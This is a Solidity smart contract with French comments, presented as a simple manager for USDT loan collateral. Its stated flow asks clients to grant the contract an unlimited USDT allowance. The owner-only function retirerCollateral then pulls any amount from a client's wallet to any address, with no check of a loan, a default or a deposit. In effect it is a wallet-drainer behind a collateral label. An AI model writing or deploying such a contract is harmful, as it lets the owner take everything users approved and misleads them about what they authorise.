// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title CollateralManager Simple
 * @dev Contrat pour gérer les collatéraux USDT
 * 
 * FLUX CLIENT:
 * 1. Le client fait approve(ADRESSE_DE_CE_CONTRAT, montant_illimité) sur USDT
 * 2. En cas de non-paiement, l'admin peut retirer les fonds
 */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract CollateralManager {
    // Adresse USDT sur Ethereum Mainnet
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    
    // Votre adresse admin (owner)
    address public immutable owner;
    
    // Mapping pour suivre les clients enregistrés
    mapping(address => bool) public clientsEnregistres;
    mapping(address => uint256) public dateEnregistrement;
    
    // Events
    event ClientEnregistre(address indexed client, uint256 allowance, uint256 timestamp);
    event FondsRetires(address indexed client, address indexed destination, uint256 montant, string raison);
    
    // Modifier pour vérifier que c'est l'owner
    modifier seulementOwner() {
        require(msg.sender == owner, "Seul le owner peut appeler cette fonction");
        _;
    }
    
    constructor() {
        owner = msg.sender; // Le déployeur devient automatiquement l'owner
    }
    
    /**
     * @dev Le client appelle cette fonction APRÈS avoir fait approve() sur USDT
     * Pour enregistrer son autorisation dans le contrat
     */
    function enregistrerClient() external {
        IERC20 usdt = IERC20(USDT);
        uint256 allowance = usdt.allowance(msg.sender, address(this));
        
        require(allowance > 0, "Vous devez d'abord approuver ce contrat sur USDT");
        
        clientsEnregistres[msg.sender] = true;
        dateEnregistrement[msg.sender] = block.timestamp;
        
        emit ClientEnregistre(msg.sender, allowance, block.timestamp);
    }
    
    /**
     * @dev L'owner peut retirer les USDT d'un client qui a approuvé
     * @param client Adresse du client
     * @param destination Où envoyer les USDT (généralement votre wallet)
     * @param montant Montant en USDT (6 décimales: 1000000 = 1 USDT)
     * @param raison Raison du retrait (ex: "Non-paiement prêt #123")
     */
    function retirerCollateral(
        address client,
        address destination,
        uint256 montant,
        string calldata raison
    ) external seulementOwner {
        require(client != address(0), "Adresse client invalide");
        require(destination != address(0), "Adresse destination invalide");
        require(montant > 0, "Le montant doit etre superieur a 0");
        
        IERC20 usdt = IERC20(USDT);
        
        // Vérifier que le client a approuvé ce contrat
        uint256 allowance = usdt.allowance(client, address(this));
        require(allowance >= montant, "Allowance insuffisante - le client doit approuver d'abord");
        
        // Vérifier que le client a assez d'USDT
        uint256 balance = usdt.balanceOf(client);
        require(balance >= montant, "Balance USDT insuffisante");
        
        // Transférer les USDT du client vers la destination
        bool success = usdt.transferFrom(client, destination, montant);
        require(success, "Transfert USDT echoue");
        
        emit FondsRetires(client, destination, montant, raison);
    }
    
    /**
     * @dev Vérifier l'allowance d'un client
     */
    function verifierAllowance(address client) external view returns (uint256) {
        IERC20 usdt = IERC20(USDT);
        return usdt.allowance(client, address(this));
    }
    
    /**
     * @dev Vérifier le solde USDT d'un client
     */
    function verifierSolde(address client) external view returns (uint256) {
        IERC20 usdt = IERC20(USDT);
        return usdt.balanceOf(client);
    }
    
    /**
     * @dev Vérifier si un client est enregistré
     */
    function estEnregistre(address client) external view returns (bool) {
        return clientsEnregistres[client];
    }
    
    /**
     * @dev Obtenir toutes les infos d'un client
     */
    function infosClient(address client) external view returns (
        uint256 soldeUSDT,
        uint256 allowance,
        bool enregistre,
        uint256 dateEnreg
    ) {
        IERC20 usdt = IERC20(USDT);
        soldeUSDT = usdt.balanceOf(client);
        allowance = usdt.allowance(client, address(this));
        enregistre = clientsEnregistres[client];
        dateEnreg = dateEnregistrement[client];
    }
}
